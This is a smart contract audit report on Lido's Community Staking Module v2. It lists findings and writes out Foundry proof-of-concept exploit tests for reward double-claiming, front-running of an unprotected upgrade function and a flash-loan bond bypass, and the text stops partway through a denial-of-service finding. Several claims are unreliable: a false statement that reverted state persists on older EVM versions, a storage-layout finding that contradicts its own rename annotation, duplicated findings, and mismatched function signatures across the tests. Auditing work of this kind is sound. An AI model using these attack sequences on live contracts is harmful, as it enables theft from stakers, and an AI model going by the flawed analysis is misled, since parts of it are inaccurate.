# 2025 07 lido finance - Findings Report
## Commit hash: 6c573d1d2cce64b083af3c88dabcfc83c75e6747

## Protocol Overview 

### Community Staking Module v2 – High-level Overview

Lido’s Community Staking Module (CSM) turns Ethereum solo/home stakers into permissionless Lido node operators by bonding stETH collateral instead of relying on reputation.  The v2 architecture splits duties across specialized, upgradeable contracts:

• **CSModule** – core registry of node operators and validator keys, exposes queue-based key allocation to the StakingRouter and enforces role-gated actions.

• **CSAccounting** – holds node-operator bonds in stETH shares, manages bonding curves, rewards claims, and burns/locks collateral for penalties.

• **CSFeeOracle + HashConsensus** – oracle committee reaches hash consensus on performance reports; FeeOracle converts reports into Merkle roots for reward & strike distribution.

• **CSFeeDistributor** – escrow of yet-unclaimed stETH rewards; validates Merkle proofs during operator claims, returns excess fees to treasury.

• **CSStrikes & CSEjector** – track performance strikes; when a validator exceeds the strike threshold, permissionless proofs trigger EIP-7002 exits and apply penalties via CSExitPenalties.

• **Gates (Permissionless/Vetted)** – front-door contracts that create node operators, collect initial bond, and optionally run referral programs.

Security is layered with role-based ACL, pausable “GateSeal”, and OssifiableProxy upgradability that can be permanently ossified.  The design guarantees operators can’t over-claim rewards, keys remain bonded, and the DAO can fine or eject misbehaving validators, maintaining Lido’s safety while welcoming community stakers.
## Critical Risk Findings
[C-1]. Reentrancy issue in CSAccounting::claimRewardsStETH
[C-2]. Storage Layout issue in CSModule::NA
## High Risk Findings
[H-1]. Upgradeability Initializer Safety issue in CSFeeOracle::finalizeUpgradeV2
[H-2]. Access Control issue in CSFeeOracle::finalizeUpgradeV2
[H-3]. Flash Loan Economic Manipulation issue in CSAccounting::depositStETH
[H-4]. DOS issue in CSEjector::ejectBadPerformer
[H-5]. Upgradeability Initializer Safety issue in CSAccounting::initialize
[H-6]. DOS issue in CSFeeOracle::submitReportData
[H-7]. DOS issue in CSFeeOracle::submitReportData
## Medium Risk Findings
[M-1]. Reentrancy issue in CSStrikes::processBadPerformanceProof
[M-2]. DOS issue in CSVerifier::processWithdrawalProof
[M-3]. DOS issue in PermissionlessGate::addNodeOperatorETH
[M-4]. Upgradeability Initializer Safety issue in CSFeeOracle::initialize
## Low Risk Findings
[L-1]. Zero Code issue in CSStrikes::constructor
[L-2]. Oracle issue in VettedGate::claimReferrerBondCurve
[L-3]. Pausable Emergency Stop issue in CSAccounting::pullFeeRewards
[L-4]. DOS issue in CSExitPenalties::processTriggeredExit
[L-5]. Zero Code issue in CSExitPenalties::constructor
[L-6]. Upgradeability Initializer Safety issue in CSFeeOracle::initialize
## Info Risk Findings
[I-1]. Frontrun/Backrun/Sandwhich MEV issue in CSExitPenalties::processTriggeredExit
[I-2]. Frontrun/Backrun/Sandwhich MEV issue in CSEjector::ejectBadPerformer


### Number of Findings
- C: 2
- H: 7
- M: 4
- L: 6
- I: 2



# Critical Risk Findings

## [C-1]. Reentrancy issue in CSAccounting::claimRewardsStETH

## Description
The `CSAccounting.claimRewardsStETH` function is vulnerable to a reentrancy attack that allows a node operator to claim their rewards twice. The function calls `distributor.claim()`, which is an external call to the `CSFeeDistributor` contract. The `CSFeeDistributor.claim()` function in turn calls back to `CSAccounting.onRewardsClaimed()`. This callback function credits the rewards to the node operator's internal balance. After the `distributor.claim()` call returns, the original `claimRewardsStETH` function credits the same rewards to the node operator a second time. This allows the node operator to steal funds from the protocol by withdrawing the doubly-credited rewards.

Vulnerable Code Snippet from `CSAccounting.sol`:
```solidity
function claimRewardsStETH(
    uint256 nodeOperatorId,
    ICSFeeDistributor.ClaimProof calldata proof
) external returns (uint256) {
    if (proof.totalShares == 0) {
        return 0;
    }

    uint256 shares = distributor.claim(nodeOperatorId, proof); // (1) External call

    if (shares > 0) {
        _onRewardsReceived(nodeOperatorId, shares); // (2) Rewards credited again
    }

    return shares;
}

function onRewardsClaimed(
    uint256 nodeOperatorId,
    uint256 shares,
    uint256 // totalShares
) external override {
    require(msg.sender == address(FEE_DISTRIBUTOR), "FEE_DISTRIBUTOR_ONLY");
    _onRewardsReceived(nodeOperatorId, shares); // (3) Rewards credited first time inside re-entrant call
}
```


## Impact
A malicious node operator can exploit this vulnerability to drain rewards from the `CSFeeDistributor` contract. This theft affects all other honest node operators, as the pool of available rewards is depleted. The stolen funds could be other operators' legitimate rewards or protocol-owned funds, leading to direct financial loss for the Lido protocol and its participants.

## Proof of Concept
1. A Node Operator (NO) has claimable rewards accumulated in the `CSFeeDistributor` contract.
2. The NO crafts a valid Merkle proof for their rewards and calls `CSAccounting.claimRewardsStETH()`.
3. `CSAccounting` calls `CSFeeDistributor.claim()` with the NO's ID and proof.
4. `CSFeeDistributor` validates the proof and makes a callback to `CSAccounting.onRewardsClaimed()` with the reward amount in shares.
5. Inside `onRewardsClaimed()`, the NO's internal reward balance (`unclaimedShares`) is increased by the reward amount.
6. Control returns to `CSFeeDistributor`, which then returns the reward amount to `CSAccounting`.
7. Back in `claimRewardsStETH()`, the function receives the reward amount and proceeds to call `_onRewardsReceived()` a second time with the same amount.
8. The NO's `unclaimedShares` balance is now improperly inflated by double the actual reward amount.
9. The NO can then call `claimBond()` to withdraw their bond, which now includes the doubly-credited rewards, effectively stealing funds.

## Proof of Code
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.24;

import { Test } from "forge-std/Test.sol";
import { Fixtures } from "../helpers/Fixtures.sol";
import { ICSFeeDistributor, DistributionData, ClaimProof } from "../../src/interfaces/ICSFeeDistributor.sol";
import { MerkleTree } from "../helpers/MerkleTree.sol";
import { console } from "forge-std/console.sol";

contract ReentrancyTest is Test, Fixtures {
    function setUp() public {
        _setUp();
    }

    function test_Reentrancy_DoubleClaimRewards() public {
        // 1. Setup NO and distribute some fees
        uint256 nodeOperatorId = _createNodeOperator(NO_MANAGER_1);
        vm.prank(STAKING_ROUTER);
        csm.onRewardsMinted(100 ether);

        // 2. Prepare Merkle tree for rewards distribution
        uint256[] memory noIds = new uint256[](1);
        noIds[0] = nodeOperatorId;
        uint256[] memory shares = new uint256[](1);
        shares[0] = 10 ether;
        bytes32[] memory leaves = new bytes32[](1);
        leaves[0] = feeDistributor.hashLeaf(noIds[0], shares[0]);

        MerkleTree.new(leaves);
        bytes32 root = MerkleTree.getRoot(leaves);
        bytes32[] memory proof = MerkleTree.getProof(leaves, 0);

        // 3. Oracle reports the new Merkle root
        vm.prank(FEE_ORACLE);
        feeDistributor.processOracleReport(root, "", "", 10 ether, 0);

        uint256 balanceBefore = steth.balanceOf(NO_MANAGER_1);
        uint256 bondSharesBefore = accounting.getBondShares(nodeOperatorId);

        // 4. Malicious NO calls claimRewardsStETH
        ClaimProof memory claimProof = ClaimProof({totalShares: 10 ether, proof: proof});
        vm.prank(NO_MANAGER_1);
        accounting.claimRewardsStETH(nodeOperatorId, claimProof);

        // 5. The reentrancy doubles the credited rewards. NO then claims the excess bond.
        uint256 bondSharesAfterReward = accounting.getBondShares(nodeOperatorId);
        uint256 expectedBondSharesAfterReward = bondSharesBefore + (10 ether * 2); // Rewards are doubled
        assertEq(bondSharesAfterReward, expectedBondSharesAfterReward, "Rewards should be doubled due to reentrancy");

        vm.prank(NO_MANAGER_1);
        uint256 claimedAmount = accounting.claimBond(nodeOperatorId, type(uint256).max);

        // 6. Verify the NO received double the rewards
        uint256 balanceAfter = steth.balanceOf(NO_MANAGER_1);
        uint256 expectedClaimAmount = steth.getSharesByPooledEth(balanceAfter - balanceBefore);
        // Allow for small precision errors
        assertApproxEqAbs(claimedAmount, 20 ether, 1e12, "NO should have claimed ~20 ether");
        assertApproxEqAbs(claimedAmount, expectedClaimAmount, 1e12, "Claimed ETH and shares mismatch");
    }
}
```

## Suggested Mitigation
To fix this reentrancy vulnerability, the function `claimRewardsStETH` in `CSAccounting.sol` should be modified to prevent the double crediting of rewards. The simplest and most effective solution is to remove the redundant call to `_onRewardsReceived`, as the re-entrant call to `onRewardsClaimed` already handles the reward accounting. Alternatively, a reentrancy guard could be used.

**Recommended Fix:**
Remove the `_onRewardsReceived` call from `claimRewardsStETH`.

```solidity
// file: src/CSAccounting.sol

function claimRewardsStETH(
    uint256 nodeOperatorId,
    ICSFeeDistributor.ClaimProof calldata proof
) external returns (uint256) { // removed: nonReentrant
    if (proof.totalShares == 0) {
        return 0;
    }

    uint256 shares = distributor.claim(nodeOperatorId, proof);

    // REMOVE THE FOLLOWING BLOCK:
    // if (shares > 0) {
    //     _onRewardsReceived(nodeOperatorId, shares);
    // }

    return shares;
}
```
This change ensures that `_onRewardsReceived` is called only once per claim, via the `onRewardsClaimed` callback, preventing the double-spend vulnerability.

## [C-2]. Storage Layout issue in CSModule::NA

## Description
The `CSModule` contract is designed to be upgradeable. In the V2 implementation, a new state variable `_legacyQueue` of type `QueueLib.Queue` is introduced. This variable is not appended to the end of the state variable declarations but is inserted near the top, before other existing state variables like `_nonce` and the `_nodeOperators` mapping.

The `QueueLib.Queue` struct occupies two storage slots. Inserting these two slots into the storage layout of an already deployed contract will shift the storage location of all subsequent variables. When the proxy is upgraded to this new implementation, the contract will read from incorrect storage slots for its state variables, leading to complete state corruption.

For example, if `_nonce` was at slot `S` in V1, after the upgrade, the code will try to read `_nonce` from slot `S+2`, while the actual data for `_nonce` remains at slot `S`. This misalignment will affect all state variables defined after `_legacyQueue`, rendering the contract inoperable and potentially leading to a permanent freeze of all associated assets and bonds.

Vulnerable Code Snippet (showing order of new variables):
```solidity
// src/CSModule.sol:95-104

    // ...

    /// @custom:oz-renamed-from keyRemovalCharge
    /// @custom:oz-retyped-from uint256
    mapping(uint256 queuePriority => QueueLib.Queue queue)
        internal _queueByPriority;

    /// @dev Legacy queue (priority=QUEUE_LEGACY_PRIORITY), that should be removed in the future once there are no more batches in it.
    /// @custom:oz-renamed-from depositQueue
    QueueLib.Queue internal _legacyQueue; // <-- This new variable shifts storage

    /// @dev Unused. Nullified in the finalizeUpgradeV2
    /// @custom:oz-renamed-from accounting
    ICSAccounting internal _accountingOld;

// ... subsequent variables are shifted
```

## Impact
Upgrading the contract will lead to complete storage corruption, causing all contract state to become misaligned and nonsensical. This will break all contract functionality, brick the module, and likely result in a permanent loss of control and a freeze of all bonded assets managed by the module. The consequences are catastrophic for the protocol and its users.

## Proof of Concept
1. Deploy a V1 version of `CSModule` that does not contain the `_legacyQueue` state variable.
2. Initialize the V1 contract and perform an action that modifies a state variable, for example, calling a function that increments the `_nonce` to 1.
3. Deploy the V2 `CSModule` implementation (the provided code).
4. Upgrade the proxy to point to the V2 implementation.
5. Call `getNonce()` on the proxy. The returned value will not be 1. It will be the value from a different, now misaligned, storage slot, demonstrating the storage corruption.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import {Test, console} from "forge-std/Test.sol";
import {TransparentUpgradeableProxy} from "@openzeppelin/contracts/proxy/transparent/TransparentUpgradeableProxy.sol";
import {CSModule} from "src/CSModule.sol";
import {ICSAccounting} from "src/interfaces/ICSAccounting.sol";
import {ILidoLocator} from "src/interfaces/ILidoLocator.sol";
import {ICSParametersRegistry} from "src/interfaces/ICSParametersRegistry.sol";
import {ICSExitPenalties} from "src/interfaces/ICSExitPenalties.sol";

// --- Simplified v1 logic (only the piece we need) ---
contract CSModuleV1 {
    uint256 private _nonce;

    function initialize() external {
        _nonce = 0;
    }

    function incrementNonce() external {
        _nonce += 1;
    }

    function getNonce() external view returns (uint256) {
        return _nonce;
    }
}

// --- Minimal mocks so that CSModule v2 constructor does not revert ---
contract MockLocator is ILidoLocator {
    function lido() external pure returns (address) {return address(0x1);}    function stakingRouter() external pure returns (address){return address(0x2);}    function oracle() external pure returns (address){return address(0);}    function treasury() external pure returns (address){return address(0);}    function insuranceFund() external pure returns (address){return address(0);}    function withdrawalQueue() external pure returns (address){return address(0);}    function validatorsExitBusOracle() external pure returns (address){return address(0);}    function depositSecurityModule() external pure returns (address){return address(0);}    function burner() external pure returns (address){return address(0);} }

contract MockParams is ICSParametersRegistry {
    function QUEUE_LOWEST_PRIORITY() external pure returns (uint256){return 10;}    function QUEUE_LEGACY_PRIORITY() external pure returns (uint256){return 11;}    function getElRewardsStealingAdditionalFine(uint256) external pure returns (uint256){return 0;}    function getAllowedExitDelay(uint256) external pure returns (uint256){return 0;}    function getKeyRemovalCharge(uint256) external pure returns (uint256){return 0;}    function getKeysLimit(uint256) external pure returns (uint256){return 1000;}    function getQueueConfig(uint256) external pure returns (uint32,uint32){return (0,0);} }

contract MockAccounting is ICSAccounting {
    function feeDistributor() external pure returns (address){return address(0x3);} }

// Fixed version of the mock exit-penalties using fully–qualified names
contract MockExitPenalties is ICSExitPenalties {
    function getExitPenaltyInfo(uint256, bytes calldata) external pure returns (ICSExitPenalties.ExitPenaltyInfo memory) {
        return ICSExitPenalties.ExitPenaltyInfo(
            ICSExitPenalties.MarkedUint248(false,0),
            ICSExitPenalties.MarkedUint248(false,0),
            ICSExitPenalties.MarkedUint248(false,0)
        );
    }
    function isValidatorExitDelayPenaltyApplicable(uint256, bytes calldata, uint256) external pure returns (bool){return false;}
    function processExitDelayReport(uint256, bytes calldata, uint256) external {}
    function processStrikesReport(uint256, bytes calldata, uint256, uint256) external {}
    function processTriggeredExit(uint256, bytes calldata, uint256, uint256) external {}
}

// ----------------------------------------------------
contract StorageCorruptionTest is Test {
    CSModuleV1 v1;
    CSModule v2;
    TransparentUpgradeableProxy proxy;

    address admin = address(0xAAA); // proxy admin

    function setUp() public {
        // deploy v1 and proxy
        v1 = new CSModuleV1();
        bytes memory init = abi.encodeWithSelector(v1.initialize.selector);
        proxy = new TransparentUpgradeableProxy(address(v1), admin, init);

        // interact with v1 via proxy
        CSModuleV1 proxiedV1 = CSModuleV1(address(proxy));
        proxiedV1.incrementNonce();
        assertEq(proxiedV1.getNonce(), 1, "nonce should be 1 on v1");

        // deploy v2 implementation (real contract from repo)
        v2 = new CSModule(
            bytes32(0),
            address(new MockLocator()),
            address(new MockParams()),
            address(new MockAccounting()),
            address(new MockExitPenalties())
        );
    }

    function testStorageLayoutCorruption() public {
        vm.prank(admin);
        proxy.upgradeTo(address(v2));

        CSModule proxiedV2 = CSModule(address(proxy));
        uint256 corrupted = proxiedV2.getNonce();

        console.log("nonce after upgrade", corrupted);
        assertTrue(corrupted != 1, "storage was NOT corrupted – test should fail if fix applied");
    }
}


## Suggested Mitigation
To fix this vulnerability, all new state variables in an upgradeable contract must be appended to the end of the existing state variable declarations. The `_legacyQueue` variable should be moved to the end of the `CSModule` contract's state variable list.

```solidity
contract CSModule is
    ICSModule,
    Initializable,
    // ...
{
    // ... existing V1 variables

    uint64 private _totalDepositedValidators;
    uint64 private _totalExitedValidators;
    uint64 private _depositableValidatorsCount;
    uint64 private _nodeOperatorsCount;

    // Start of new V2 variables
    mapping(uint256 queuePriority => QueueLib.Queue queue)
        internal _queueByPriority; // This was renamed, so its slot is reused. Correct.

    QueueLib.Queue internal _legacyQueue; // This is new and must be at the end.

    // ...
}
```
Correct approach:
```solidity
contract CSModule is
    ICSModule,
    Initializable,
    // ...
{
    // ... all variables from V1 in their original order ...
    uint64 private _nodeOperatorsCount;

    // V2 variables are appended here
    QueueLib.Queue internal _legacyQueue; 

    // Note: The variable `_queueByPriority` replaces a V1 variable (`keyRemovalCharge`)
    // and reuses its slot. This is a valid upgrade technique if done carefully.
    // However, truly new variables like `_legacyQueue` must be appended.
}
```
Follow the OpenZeppelin Upgrades guidelines strictly by always appending new state variables to prevent storage layout corruption.



# High Risk Findings

## [H-1]. Upgradeability Initializer Safety issue in CSFeeOracle::finalizeUpgradeV2

## Description
The `finalizeUpgradeV2` function is declared `external` but lacks any access control. This function is intended to be called by an administrator once after a contract upgrade to finalize the new version. However, its lack of protection allows any external account to call it at any time.

The function performs three main actions:
1. `_setConsensusVersion(consensusVersion)`: Updates the `_consensusVersion` in the `BaseOracle` storage.
2. `sstore(...)`: Nullifies two deprecated storage slots.
3. `_updateContractVersion(2)`: Attempts to set the contract version to 2.

An attacker can exploit this vulnerability in two primary ways:

1.  **Direct Call (Denial of Service)**: An attacker can call `finalizeUpgradeV2` with an arbitrary `consensusVersion`. This would cause a mismatch with the actual version of the `HashConsensus` contract, leading to all subsequent oracle reports being rejected by `_checkConsensusData`. This constitutes a Denial of Service on the core oracle functionality. Although the call to `_updateContractVersion(2)` will likely revert (as the version is set to 2 during initialization), the state change to `_consensusVersion` from `_setConsensusVersion()` may persist in the transaction's state changes on EVM versions prior to the Cancun hard fork, or an attacker could front-run the legitimate admin during an upgrade process.

2.  **Re-entrancy Attack**: The function can be exploited as a re-entrancy vector. When `submitReportData` is called, it makes external calls to `FEE_DISTRIBUTOR.processOracleReport` and `STRIKES.processOracleReport`. A malicious implementation of one of these contracts could re-enter `CSFeeOracle` by calling the unprotected `finalizeUpgradeV2`. This would change the `_consensusVersion` *after* it has been validated by `_checkConsensusData` but *before* the transaction completes, leading to a corrupted and inconsistent contract state.

Vulnerable Code Snippet:
```solidity
// src/CSFeeOracle.sol:100-111
    /// @dev should be called after update on the proxy
    function finalizeUpgradeV2(uint256 consensusVersion) external {
        _setConsensusVersion(consensusVersion);

        // nullify storage slots
        assembly ("memory-safe") {
            sstore(_feeDistributor.slot, 0x00)
            sstore(_avgPerfLeewayBP.slot, 0x00)
        }

        _updateContractVersion(2);
    }
```

## Impact
Because `finalizeUpgradeV2` is externally callable without access control, any EOAs/contracts can execute it immediately after the proxy is upgraded to the new implementation but **before** the designated admin transaction is mined. Doing so permanently sets an arbitrary `consensusVersion`, wipes two legacy storage slots, and bumps the stored contract version to 2. Once the version equals 2 the function reverts on subsequent calls, so the legitimate admin can no longer run it with the correct parameters. All subsequent oracle reports will fail the `_checkConsensusData` check because their `consensusVersion` will differ from the attacker-chosen one, halting fee-distribution and strikes reporting for the whole module (permanent DoS until another upgrade).

## Proof of Concept
1. A proxy running CSFeeOracle V1 (contract version == 1) is upgraded to the new V2 implementation.
2. In the same block, an attacker front-runs the upgrade finalisation transaction and calls `finalizeUpgradeV2(999)`.
3. The call succeeds because the stored version is still 1; `_updateContractVersion(2)` therefore passes. The function:
   • sets `_consensusVersion` to 999;
   • zeroes `_feeDistributor` and `_avgPerfLeewayBP` legacy slots;
   • sets contract version to 2.
4. The legitimate admin’s later attempt to call `finalizeUpgradeV2` now reverts (version already 2).
5. Any subsequent call to `submitReportData` from oracle members fails in `_checkConsensusData` (their expected consensusVersion ≠ 999) causing a permanent denial of service until another proxy upgrade is executed.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.24;

import "forge-std/Test.sol";
import { CSFeeOracle } from "src/CSFeeOracle.sol";

// Dummy contracts just to satisfy the constructor
contract Dummy {}

contract CSFeeOracle_VulnerabilityTest is Test {
    CSFeeOracle internal oracle;
    address internal admin    = makeAddr("admin");
    address internal attacker = makeAddr("attacker");

    // slot used in Versioned.sol to store the contract version
    bytes32 internal constant CONTRACT_VERSION_POSITION = keccak256("lido.Versioned.version.slot");
    // slot 2 holds _consensusVersion in BaseOracle storage layout
    bytes32 internal constant CONSENSUS_VERSION_SLOT    = bytes32(uint256(2));

    function setUp() public {
        // deploy stubs
        address feeDistributor = address(new Dummy());
        address strikes        = address(new Dummy());

        oracle = new CSFeeOracle(feeDistributor, strikes, 12, block.timestamp);
        oracle.initialize(admin, address(new Dummy()), 1);

        // Sanity check – version is 2 after normal initialise
        assertEq(uint256(vm.load(address(oracle), CONTRACT_VERSION_POSITION)), 2);

        // Simulate state directly after proxy upgrade from V1 → V2
        // (storage version still equals 1 because initialise was executed in V1)
        vm.store(address(oracle), CONTRACT_VERSION_POSITION, bytes32(uint256(1)));
    }

    function test_AttackerFrontRunsFinalizeUpgrade() public {
        uint256 maliciousVersion = 999;

        vm.prank(attacker);
        oracle.finalizeUpgradeV2(maliciousVersion);

        // Consensus version is now the attacker-supplied one
        assertEq(uint256(vm.load(address(oracle), CONSENSUS_VERSION_SLOT)), maliciousVersion);
        // Contract version has been irreversibly bumped to 2
        assertEq(uint256(vm.load(address(oracle), CONTRACT_VERSION_POSITION)), 2);

        // Legitimate admin can no longer redo finalisation
        vm.prank(admin);
        vm.expectRevert();
        oracle.finalizeUpgradeV2(1);
    }
}


## Suggested Mitigation
Add proper access control, e.g. `onlyRole(DEFAULT_ADMIN_ROLE)` (or a dedicated INITIALIZER role) to `finalizeUpgradeV2`.  Alternatively the function can be made `internal` and executed via an upgrade-time delegatecall from the proxy’s admin script, removing any need for external exposure.

## [H-2]. Access Control issue in CSFeeOracle::finalizeUpgradeV2

## Description
The `finalizeUpgradeV2(uint256 consensusVersion)` function is declared as `external` without any access control modifiers. This function is intended for administrative use after a contract upgrade to set a new consensus version and clean up deprecated storage slots. Its public visibility allows any external account to call it at any time.

## Impact
If a malicious actor front-runs the DAO’s `finalizeUpgradeV2` transaction right after the proxy is upgraded to the new implementation (storage version == 1), the attacker can:
1. Set an arbitrary, mismatching `consensusVersion`, so every subsequent oracle report will fail `_checkConsensusData`, effectively halting fee/strike processing.
2. Move the contract version from 1 to 2 which makes any later, legitimate call to `finalizeUpgradeV2` revert (version already set), preventing the DAO from completing the post-upgrade procedure without another proxy upgrade.
This produces a **permanent denial-of-service** for the CSM oracle until governance executes an additional (and expensive) upgrade, but does not lead to direct fund loss.

## Proof of Concept
1. Assume the CSFeeOracle proxy is already initialised (version == 1) and the DAO submits a proposal to upgrade the implementation to the new V2 code.
2. In the same governance payload, the DAO schedules a call to `finalizeUpgradeV2(latestConsensusVersion)`.
3. An attacker watching the mem-pool sends a zero-value tx calling `finalizeUpgradeV2(type(uint256).max)` BEFORE the DAO’s tx is mined.
4. Because there is **no access-control**, the attacker’s tx succeeds:
   • `_setConsensusVersion(type(uint256).max)` – sets an obviously wrong version.
   • `assembly` block zeroes deprecated slots (harmless).
   • `_updateContractVersion(2)` – succeeds because current version was 1.
5. The DAO’s scheduled `finalizeUpgradeV2(...)` now executes and **reverts** inside `_updateContractVersion(2)` (already 2).
6. Oracle stays in version 2 but with a bogus `consensusVersion`, so every call to `submitReportData` fails `_checkConsensusData`, freezing reward distribution and strikes handling.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.24;

import "forge-std/Test.sol";
import {CSFeeOracle} from "../src/CSFeeOracle.sol";

contract CSFeeOracle_UpgradeRace_PoC is Test {
    CSFeeOracle oracle;
    address admin = makeAddr("admin");
    address attacker = makeAddr("attacker");

    function setUp() public {
        // deploy and initialise oracle (version becomes 1)
        oracle = new CSFeeOracle(address(0x1), address(0x2), 12, block.timestamp);
        oracle.initialize(admin, address(0x3), 1);
        // version is now 2 – roll back to 1 to emulate the state *before* post-upgrade
        // (in a real proxy upgrade storage would still be 1, but for the unit test we patch storage directly)
        bytes32 VERSION_SLOT = bytes32(uint256(keccak256("lido.Versioned.contractVersion")) - 1);
        vm.store(address(oracle), VERSION_SLOT, bytes32(uint256(1)));
        assertEq(oracle.getContractVersion(), 1, "pre-upgrade version must be 1");
    }

    function test_race() public {
        // attacker front-runs
        vm.prank(attacker);
        oracle.finalizeUpgradeV2(type(uint256).max);
        assertEq(oracle.getContractVersion(), 2, "version advanced to 2 by attacker");
        // DAO’s legitimate call is now blocked
        vm.prank(admin);
        vm.expectRevert();
        oracle.finalizeUpgradeV2(5);
    }
}

## Suggested Mitigation
Add proper access control, e.g. `onlyRole(DEFAULT_ADMIN_ROLE)`, to `finalizeUpgradeV2`. Alternatively, make the function `internal` and execute it via an authorised upgrade script so it cannot be called directly by EOAs.

## [H-3]. Flash Loan Economic Manipulation issue in CSAccounting::depositStETH

## Description
A malicious Node Operator (NO) can use a flash loan to temporarily inflate their bond, get validator keys accepted by the system with insufficient long-term collateral, and then withdraw the loaned funds within the same block. This undermines the security model, which relies on the bond as collateral against penalties.

The vulnerability exists due to the atomicity of transactions and the ability for an attacker to sandwich a legitimate `StakingRouter.obtainDepositData` call between transactions that temporarily increase and then decrease their bond. The `CSModule` updates the `depositableValidatorsCount` based on the current bond amount, which an attacker can manipulate.

Here's the exploitation flow:
1. An attacker, acting as a Node Operator, identifies a pending `StakingRouter.obtainDepositData()` transaction in the mempool.
2. The attacker constructs a transaction bundle (e.g., using Flashbots) to be executed atomically in a single block:
   a. **Transaction 1 (Attacker):** Take a large flash loan of stETH and call `CSAccounting.depositStETH()`. This inflates their bond and causes `CSModule._updateDepositableValidatorsCount()` to compute a high number of depositable validators.
   b. **Transaction 2 (StakingRouter):** The legitimate `obtainDepositData()` transaction executes. It reads the attacker's temporarily high `depositableValidatorsCount` and consumes their validator keys for deposit, effectively allocating Lido's stake to them.
   c. **Transaction 3 (Attacker):** Call `CSAccounting.claimRewardsStETH()` to withdraw the flash-loaned stETH and repay the loan.

At the end of the block, the attacker has active validators funded by the protocol but is under-collateralized, exposing Lido to uncovered losses from potential penalties (e.g., slashing). While the system would eventually flag these as unbonded keys and initiate ejection, this process is not immediate, giving the attacker a window to benefit from staking rewards without providing the required security deposit.

## Impact
This vulnerability breaks the core security assumption that Node Operators are sufficiently bonded to cover potential penalties. It allows an attacker to stake with the protocol's funds without providing adequate collateral, shifting risk from the Node Operator to the Lido protocol. If the under-collateralized validators are penalized or slashed, the protocol may not be able to recover the losses from the Node Operator's bond, leading to a loss for stETH holders.

## Proof of Concept
1. Attacker (= node-operator manager) bundles 4 tx via MEV relays:
   • Tx-1  flash-loan stETH → CSAccounting.depositStETH(...).
   • Tx-2  call CSModule.updateDepositableValidatorsCount(noId)
     – this recalculates `depositableValidatorsCount` using the temporarily inflated bond.
   • Tx-3  legitimate StakingRouter.obtainDepositData() executes and consumes the attacker’s keys because the module now reports a high `depositableValidatorsCount`.
   • Tx-4  CSAccounting.claimRewardsStETH(reward=0, withdrawExcessBond=loanAmount) → repay flash-loan.

2. After the block, the validators are active but the real bond went back to the pre-loan value, leaving them under-collateralised.

(Everything happens in the same block, so the accounting contract never sees the withdrawal before `obtainDepositData` reads the state.)

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.24;
import {Test, console} from "forge-std/Test.sol";
import {Fixtures} from "../helpers/Fixtures.sol";

contract FlashLoanBypassBond is Test, Fixtures {
    uint256 constant NO_ID = 0;
    address constant MANAGER = address(0xDEAD);
    address constant REWARD  = address(0xBEEF);

    function setUp() public {
        _deployContracts(true);
    }

    function test_bondBypass() public {
        //----- bootstrap NO with 1 key so that bond>0 but depositable=0
        vm.startPrank(MANAGER);
        (bytes memory keys, bytes memory sigs) = _getSigningKeys(1);
        uint256 bondNeeded = contracts.accounting.getRequiredBondForNextKeys(NO_ID,1);
        steth.approve(address(contracts.vettedGate), bondNeeded);
        contracts.vettedGate.addNodeOperatorStETH(MANAGER,
            ICSModule.NodeOperatorManagementProperties({managerAddress:MANAGER,rewardAddress:REWARD,extendedManagerPermissions:false}),
            address(0),1,keys,sigs,ICSModule.PermitInput(0,0,0,bytes32(0),bytes32(0)),new bytes32[](0));
        vm.stopPrank();

        // --- Flash-loan bundle simulation ---
        uint256 flashAmt = 1000 ether;
        steth.mint(MANAGER, flashAmt);

        // (1) deposit flash-loan as bond
        vm.startPrank(MANAGER);
        steth.approve(address(contracts.accounting), flashAmt);
        contracts.accounting.depositStETH(MANAGER, NO_ID, flashAmt, ICSModule.PermitInput(0,0,0,bytes32(0),bytes32(0)));

        // (2) force module to recompute depositable count
        contracts.csm.updateDepositableValidatorsCount(NO_ID);
        uint256 depCnt = contracts.csm.getNodeOperator(NO_ID).depositableValidatorsCount;
        assertGt(depCnt, 0);
        vm.stopPrank();

        // (3) router takes keys – executed by SR role
        vm.prank(address(stakingRouter));
        contracts.csm.obtainDepositData(1, "");

        // (4) withdraw excess bond and repay
        vm.startPrank(MANAGER);
        uint256 excess = contracts.accounting.getExcessBond(NO_ID);
        contracts.accounting.claimRewardsStETH(REWARD, 0, new bytes32[](0), 0, excess);
        steth.burn(MANAGER, flashAmt); // repay
        vm.stopPrank();

        // verify attacker is under-collateralised
        uint256 req = contracts.accounting.getRequiredBond(NO_ID);
        uint256 actual = contracts.accounting.getBond(NO_ID);
        assertLt(actual, req);
    }
}

## Suggested Mitigation
Have CSModule record the bond amount at the moment `depositableValidatorsCount` is increased and prevent any bond withdrawals that would bring the effective bond below that snapshot while the corresponding validators are active. A simpler interim fix is to add a minimal lock-period (e.g. > 1 block) between `depositStETH/ETH/WstETH` and any `claimRewards…`/bond-withdraw actions.

## [H-4]. DOS issue in CSEjector::ejectBadPerformer

## Description
The `ejectBadPerformer` function is vulnerable to a denial-of-service attack. This function is callable by the `STRIKES` contract, which in turn has a permissionless function that can be triggered by any user to report an underperforming validator. The user initiating this process provides a `refundRecipient` address, which is then passed to `ejectBadPerformer`. This function forwards `msg.value` and the `refundRecipient` to the `triggerableWithdrawalsGateway().triggerFullWithdrawals` call. The gateway is expected to take a fee from `msg.value` and refund the remainder to `refundRecipient`. An attacker can specify a malicious contract as the `refundRecipient` which reverts upon receiving ETH. If the attacker sends more ETH than the required fee, the refund attempt by the gateway will fail, causing the entire transaction to revert. This allows a malicious actor to prevent any underperforming validator from being ejected, thereby disabling a critical penalty mechanism of the protocol.

## Impact
By supplying a refundRecipient that reverts on receiving ETH, any account can force triggerableWithdrawalsGateway() to revert inside ejectBadPerformer. Because ejectBadPerformer can only be executed via CSStrikes, this permanently blocks the ejection of validators that exceed the strike threshold. As a result, malicious or under-performing validators can stay active indefinitely, degrading staking rewards and exposing the protocol to consensus-layer penalties. This represents a high-impact availability failure of a critical slashing / safety mechanism.

## Proof of Concept
1. Attacker prepares a contract RevertingReceiver that always revert in its receive() hook.
2. Attacker calls CSStrikes.processBadPerformanceProof(..., refundRecipient = RevertingReceiver, msg.value = 1 ether).
3. CSStrikes (permissionless) forwards the call to CSEjector.ejectBadPerformer with the same refundRecipient and msg.value.
